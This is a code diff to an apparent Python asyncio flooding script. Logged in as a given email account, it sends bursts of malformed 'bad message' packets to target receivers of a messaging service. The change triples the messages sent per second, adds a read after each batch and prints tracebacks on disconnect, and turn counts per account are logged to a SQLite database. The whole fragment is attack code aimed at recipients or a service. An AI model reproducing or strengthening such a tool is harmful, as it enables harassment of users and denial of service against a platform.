@@ -111,10 +111,14 @@ async def one(email, targets, wait=0):
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
                     await asyncio.sleep(1)
                     i += 1
                     if i % 5 == 0:
                         writer.write(b'\x00\x00\x00\x02\x01\x00')
+                    await reader.read(1024)
                     #if i % 30 == 0:
                     #    # read packages and do nothing
                     #    head = await reader.read(4)
@@ -125,6 +129,8 @@ async def one(email, targets, wait=0):
                 # rd = lambda : random.randint(0,255).to_bytes(1, byteorder='big')
                 # writer.write(b"\x00\x00\x00\x0e\x01\x01\xf0\x7b\x05" + rd() + rd() + rd() + rd() + rd() + rd() + rd() + rd() + b"\x42")
         except BrokenPipeError:
+            import traceback
+            print(traceback.format_exc())
             print(email, "disconnected after", i, "turns")
             conn = sqlite3.connect("data.db")
             conn.isolation_level = None   # auto commit
